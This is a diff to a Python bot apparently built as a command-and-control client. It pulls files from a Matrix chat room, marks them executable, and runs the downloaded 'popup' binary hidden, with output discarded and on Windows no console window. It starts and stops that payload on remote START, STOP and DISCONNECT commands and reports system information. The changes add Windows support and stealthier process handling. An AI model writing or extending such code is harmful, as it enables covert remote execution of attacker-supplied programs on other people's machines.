@@ -38,14 +38,21 @@ class Payload:
         if self.running:
             return
         try:
-            self.proc = subprocess.Popen(
-                [self.payload_path], 
-                stdout=subprocess.DEVNULL,  # Discard output
-                stderr=subprocess.DEVNULL,
-                shell=True,
-                # Creates a new process group so we can kill the group and all its tkinter child procs
-                preexec_fn=os.setsid,  
-            )
+            start_args = {
+                'stdout': subprocess.DEVNULL,
+                'stderr': subprocess.DEVNULL,
+                'shell': True
+            }
+
+            if sys.platform == 'win32':
+                start_args['creationflags'] = (
+                    subprocess.CREATE_NEW_PROCESS_GROUP | # os.setsid doesn't exist on windows
+                    subprocess.CREATE_NO_WINDOW # dont open terminal for process
+                )
+            else:
+                start_args['preexec_fn'] = os.setsid
+
+            self.proc = subprocess.Popen(self.payload_path, **start_args)
             self.running = True
             print("running payload")
         except Exception as e:
@@ -56,12 +63,15 @@ class Payload:
         if not self.running:
             return
         try:
-            os.killpg(os.getpgid(self.proc.pid), signal.SIGKILL)
+            if sys.platform == 'win32':
+                subprocess.call(['taskkill', '/F', '/T', '/PID', str(self.proc.pid)])
+            else:
+                os.killpg(os.getpgid(self.proc.pid), signal.SIGKILL)
+            print("stopped payload")
+            self.running = False
+            
         except Exception as e:
             print(e)
-            return
-        print("stopped payload")
-        self.running = False
 
 class Bot:
     access_token: str
@@ -72,7 +82,7 @@ class Bot:
     command_listener: uuid.UUID
     
     last_ping: float = 0
-    ping_timeout_treshold: float = 60
+    ping_timeout_treshold: float = 40
 
     payload: Payload
     
@@ -123,6 +133,7 @@ class Bot:
     def download_file(self, event, download_dir="downloads") -> str:
         content = event["content"]
         filename = content.get("body", "payload_file")
+        download_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), download_dir)
         filepath = os.path.join(download_dir, filename)
         os.makedirs(download_dir, exist_ok=True)
         
@@ -148,14 +159,21 @@ class Bot:
             "b",
             limit=10
         )
+        
+        bin_name = "popup" 
+        if sys.platform == "win32":
+            bin_name += ".exe"
+                
         for event in payload_event["chunk"]:
-            msg_type = event["content"].get("msgtype", "")
+            content = event["content"]
+            msg_type = content.get("msgtype", "")
             if msg_type == "m.image":
                 self.download_file(event)
             elif msg_type == "m.file":
-                path = self.download_file(event)
-                os.chmod(path, 0o755)  # Read & execute for all, write for owner
-                self.payload = Payload(path)
+                if content.get("body", "") == bin_name:
+                    path = self.download_file(event)
+                    os.chmod(path, 0o755)  # Read & execute for all, write for owner
+                    self.payload = Payload(path)
 
         
     def get_system_info(self) -> str:
@@ -217,8 +235,9 @@ class Bot:
                 self.payload.start()
             elif status == "STOP":
                 self.payload.stop()
-            else:
-                print("INVALID PAYLOAD COMMAND:", status)
+
+        elif command == "DISCONNECT":
+            sys.exit(0)
         else:
             print(f"UNKNOWN: {msgbody}")
             
